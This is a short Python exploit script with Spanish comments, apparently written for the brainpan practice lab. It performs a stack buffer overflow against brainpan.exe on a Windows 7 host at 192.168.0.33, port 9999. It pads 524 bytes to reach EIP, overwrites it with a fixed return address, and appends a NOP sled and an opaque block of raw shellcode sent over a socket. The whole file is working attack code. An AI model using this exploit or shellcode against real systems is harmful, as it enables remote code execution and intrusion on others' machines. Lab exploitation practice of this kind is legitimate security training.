#!/usr/bin/python3

import socket                  
from struct import pack        

# Cantidad exacta de bytes para alcanzar el EIP (calculado previamente con pattern_offset)
offset = 524

# Relleno con 'A' hasta llegar al EIP
before_eip = b"A" * offset

eip = pack("<I", 0x311712f3)

shellcode = (
    b"\xda\xd3\xbd\x26\x37\x98\x45\xd9\x74\x24\xf4\x5b\x33\xc9"
    b"\xb1\x52\x31\x6b\x17\x83\xc3\x04\x03\x4d\x24\x7a\xb0\x6d"
    b"\xa2\xf8\x3b\x8d\x33\x9d\xb2\x68\x02\x9d\xa1\xf9\x35\x2d"
    b"\xa1\xaf\xb9\xc6\xe7\x5b\x49\xaa\x2f\x6c\xfa\x01\x16\x43"
    b"\xfb\x3a\x6a\xc2\x7f\x41\xbf\x24\x41\x8a\xb2\x25\x86\xf7"
    b"\x3f\x77\x5f\x73\xed\x67\xd4\xc9\x2e\x0c\xa6\xdc\x36\xf1"
    b"\x7f\xde\x17\xa4\xf4\xb9\xb7\x47\xd8\xb1\xf1\x5f\x3d\xff"
    b"\x48\xd4\xf5\x8b\x4a\x3c\xc4\x74\xe0\x01\xe8\x86\xf8\x46"
    b"\xcf\x78\x8f\xbe\x33\x04\x88\x05\x49\xd2\x1d\x9d\xe9\x91"
    b"\x86\x79\x0b\x75\x50\x0a\x07\x32\x16\x54\x04\xc5\xfb\xef"
    b"\x30\x4e\xfa\x3f\xb1\x14\xd9\x9b\x99\xcf\x40\xba\x47\xa1"
    b"\x7d\xdc\x27\x1e\xd8\x97\xca\x4b\x51\xfa\x82\xb8\x58\x04"
    b"\x53\xd7\xeb\x77\x61\x78\x40\x1f\xc9\xf1\x4e\xd8\x2e\x28"
    b"\x36\x76\xd1\xd3\x47\x5f\x16\x87\x17\xf7\xbf\xa8\xf3\x07"
    b"\x3f\x7d\x53\x57\xef\x2e\x14\x07\x4f\x9f\xfc\x4d\x40\xc0"
    b"\x1d\x6e\x8a\x69\xb7\x95\x5d\x56\xe0\x95\x8a\x3e\xf3\x95"
    b"\xb5\x05\x7a\x73\xdf\x69\x2b\x2c\x48\x13\x76\xa6\xe9\xdc"
    b"\xac\xc3\x2a\x56\x43\x34\xe4\x9f\x2e\x26\x91\x6f\x65\x14"
    b"\x34\x6f\x53\x30\xda\xe2\x38\xc0\x95\x1e\x97\x97\xf2\xd1"
    b"\xee\x7d\xef\x48\x59\x63\xf2\x0d\xa2\x27\x29\xee\x2d\xa6"
    b"\xbc\x4a\x0a\xb8\x78\x52\x16\xec\xd4\x05\xc0\x5a\x93\xff"
    b"\xa2\x34\x4d\x53\x6d\xd0\x08\x9f\xae\xa6\x14\xca\x58\x46"
    b"\xa4\xa3\x1c\x79\x09\x24\xa9\x02\x77\xd4\x56\xd9\x33\xf4"
    b"\xb4\xcb\x49\x9d\x60\x9e\xf3\xc0\x92\x75\x37\xfd\x10\x7f"
    b"\xc8\xfa\x09\x0a\xcd\x47\x8e\xe7\xbf\xd8\x7b\x07\x13\xd8"
    b"\xa9"
)

# Construcción final del payload:
payload = before_eip + eip + b"\x90" * 16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Se conecta a la IP de la víctima (Windows 7) y al puerto 9999 donde está brainpan.exe
s.connect(("192.168.0.33", 9999))

# Se envía el payload malicioso
s.send(payload)

s.close()
